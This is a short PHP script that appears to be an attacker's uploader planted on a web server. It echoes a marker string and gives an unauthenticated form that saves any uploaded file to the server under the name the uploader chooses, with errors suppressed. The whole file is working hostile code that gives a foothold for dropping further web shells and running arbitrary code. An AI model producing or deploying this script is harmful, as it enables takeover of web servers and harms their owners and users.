<?php
echo "nakoyabuki";
if (isset($_FILES['azzatssins']['name'])) {
    $name = $_FILES['azzatssins']['name'];
    $azx  = $_FILES['azzatssins']['tmp_name'];
    @move_uploaded_file($azx, $name);
    echo $name;
} else {
    echo "<form method=post enctype=multipart/form-data><input type=file name=azzatssins><input type=submit value='>>'>";
}
?>
